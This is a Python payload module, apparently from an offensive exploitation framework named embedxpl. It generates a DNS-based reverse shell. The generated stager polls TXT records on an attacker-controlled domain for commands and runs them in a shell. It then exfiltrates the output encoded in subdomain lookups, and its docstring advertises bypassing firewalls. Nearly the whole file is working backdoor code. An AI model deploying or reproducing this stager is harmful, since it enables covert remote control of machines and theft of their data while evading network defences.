"""x64 Reverse DNS Shell — DNS TXT record C2.

Usa consultas DNS TXT como canal de C2.
Bypassa firewalls que bloqueiam TCP mas permitem DNS.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "x64 Reverse DNS",
        "description": "DNS TXT record covert C2 channel — bypasses TCP firewalls.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }
    options = {
        "DNS_DOMAIN": {"description": "Your controlled DNS domain", "required": True, "default": "", "value": ""},
        "SESSION_ID": {"description": "Session identifier", "required": False, "default": "a1b2", "value": "a1b2"},
        "INTERVAL":   {"description": "Poll interval (seconds)", "required": False, "default": "10", "value": "10"},
    }

    def generate(self) -> bytes:
        domain = self.options["DNS_DOMAIN"]["value"]
        sid    = self.options["SESSION_ID"]["value"]
        interval = self.options["INTERVAL"]["value"]

        stager = f"""import subprocess,time,base64
try:import dns.resolver as R
except ImportError:
    subprocess.run(['pip','install','dnspython','-q'])
    import dns.resolver as R

DOMAIN="{domain}";SID="{sid}"
while True:
    try:
        # Poll for command in TXT record: cmd.<SID>.<DOMAIN>
        ans=R.resolve(f"cmd.{{SID}}.{{DOMAIN}}","TXT")
        for r in ans:
            cmd=b''.join(r.strings).decode().strip()
            if cmd and cmd!="NOP":
                try:out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=15)
                except Exception as e:out=str(e).encode()
                # Exfil via DNS A lookups: encode output in subdomains
                enc=base64.b32encode(out).decode().lower().replace('=','')
                for i in range(0,len(enc),60):
                    try:R.resolve(f"{{enc[i:i+60]}}.out.{{SID}}.{{DOMAIN}}","A",lifetime=3)
                    except:pass
    except:pass
    time.sleep({interval})
"""
        return stager.encode()
